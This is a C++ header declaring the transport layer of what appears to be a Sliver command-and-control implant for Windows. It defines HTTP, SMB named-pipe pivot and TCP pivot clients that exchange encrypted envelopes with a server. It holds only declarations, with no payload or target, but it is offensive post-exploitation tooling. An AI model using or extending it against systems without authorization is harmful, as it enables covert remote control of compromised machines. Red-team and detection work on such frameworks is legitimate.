#pragma once
#include <windows.h>
#include "sliver.pb.h"
#include <cpr/cpr.h>
#include "CipherContext.h"
#include <mutex>
#include <vector>

using namespace std;
namespace transports{

	class IClient {
	public:
		IClient();
		virtual bool SessionInit() = 0;
		virtual bool WriteEnvelope(sliverpb::Envelope&) = 0;
		virtual bool WriteAndReceive(const sliverpb::Envelope&, sliverpb::Envelope&) = 0;
		virtual bool WriteEnvelopeNoResp(sliverpb::Envelope&) = 0;
		virtual unique_ptr<sliverpb::Envelope> ReadEnvelope() = 0;
	};
#ifdef HTTP
	class HttpClient : public IClient{
	public:
		HttpClient(string base_URI, unsigned long long netTimeout, unsigned long long tlsTimeout, unsigned long long pollTimeout, string proxyHost = "", int proxyPort = 0, string proxyUsername = "", string proxyPassword = "", string hostHeader = "");
		bool SessionInit() override;
		bool WriteEnvelope(sliverpb::Envelope&) override;
		bool WriteEnvelopeNoResp(sliverpb::Envelope&) override;
		bool WriteAndReceive(const sliverpb::Envelope&,sliverpb::Envelope&) override;
		string SessionURL();
		string PollURL();
		string StartSessionURL();
		std::vector<string> RandomPath(std::vector<string>&, std::vector<string>&, string);
		unique_ptr<sliverpb::Envelope> ReadEnvelope() override;

		std::chrono::system_clock::duration timeDelta;
		string sessionID;
		string base_URI;
		string origin;
		string pathPrefix;
		string proxyUrl;
		crypto::CipherContext context;
		unsigned long long netTimeout;
		unsigned long long tlsTimeout;
		unsigned long long pollTimeout;
		int maxErrors;
		bool forceHTTP;
		string hostHeader;
		string proxyConfig;
		string proxyUsername;
		string proxyPassword;
		bool askProxyCreds;
		bool closed;
	private:
		unique_ptr<cpr::Session> session;
		mutex pollMutex;
	};

#endif
#if defined(PIVOT) && defined(SMBPIVOT)

	class NamedPipeClient : public IClient {
	public:
		NamedPipeClient(const string& pipe_name);
		bool SessionInit() override;
		bool WriteEnvelope(sliverpb::Envelope&) override;
		bool WriteEnvelopeNoResp(sliverpb::Envelope&) override;
		bool WriteEnvelope_nolock(sliverpb::Envelope&);
		bool WriteAndReceive(const sliverpb::Envelope&, sliverpb::Envelope&) override;
		unique_ptr<sliverpb::Envelope> ReadEnvelope() override;
		bool ReadEnvelope(sliverpb::Envelope&);
		unique_ptr<sliverpb::Envelope> ReadEnvelopeBlocking();
		std::chrono::system_clock::duration timeDelta;
		bool closed;
		crypto::CipherContext peer_ctx;
		crypto::CipherContext server_ctx;
		string base_URI;
	private:
		bool Check();
		string read();
		bool write(const string&);
		bool writeAndRecv(const string&, string&);
		mutex pollMutex;
		HANDLE hPipeWrite,hPipeRead;
		string pivotSessionID;
		string pipe_name;
	};

#endif

#if defined(PIVOT) && defined(TCPPIVOT)
	class TCPClient : public IClient {
	public:
		TCPClient(const string& pipe_name);
		bool SessionInit() override;
		bool WriteEnvelope(sliverpb::Envelope&) override;
		bool WriteEnvelopeNoResp(sliverpb::Envelope&) override;
		bool WriteEnvelope_nolock(sliverpb::Envelope&);
		bool WriteAndReceive(const sliverpb::Envelope&, sliverpb::Envelope&) override;
		unique_ptr<sliverpb::Envelope> ReadEnvelope() override;
		bool ReadEnvelope(sliverpb::Envelope&);
		unique_ptr<sliverpb::Envelope> ReadEnvelopeBlocking();
		std::chrono::system_clock::duration timeDelta;
		bool closed;
		crypto::CipherContext peer_ctx;
		crypto::CipherContext server_ctx;
		string base_URI;
	private:
		bool Check();
		string read();
		bool write(const string&);
		bool writeAndRecv(const string&, string&);
		mutex pollMutex;
		string pivotSessionID;
		string bind_address;
		struct addrinfo* addr_info;
		SOCKET connect_socket;
	};

#endif
}
